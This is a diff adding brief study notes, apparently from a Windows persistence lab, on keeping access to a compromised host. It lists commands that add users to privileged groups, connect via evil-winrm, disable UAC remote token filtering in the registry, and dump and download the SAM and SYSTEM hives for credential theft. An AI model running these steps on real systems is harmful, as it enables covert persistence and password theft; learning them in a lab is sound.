@@ -1,0 +1,31 @@
+-reasons for local persistence
+1. re-exploitation isn't always possible
+2. getting a foothold is hard to reproduce
+3. security is one step behind
+
+---------------------------------------------------------------------------------------------
+
+Assign Group Membership
+-make unprivileged user gain admin privileges
+net localgroup administrators thmuser0 /add
+
+-avoid being suspicious - use backup operators group
+-won't have admin privileges but have read/write access to anyfile or registry key on the system
+-can escalate to admin account trivially
+net localgroup "Backup Operators" thmuser1 /add
+
+-add to RDP or winRM
+net localgroup "Remote Mangement Users" thmuser1 /add
+
+-connect using evil-winrm
+evil-winrm -i [IP] -u thmuser1 -p Password321
+whoami /groups
+
+-LocalAccountTokenFilterPolicy implemented by User Account Control (UAC) - strips admin privileges when logging in remotely
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+
+(on evil-winrm)
+reg save hklm\system system.bak
+reg save hklm\sam sam.bak
+download system.bak
+download sam.bak
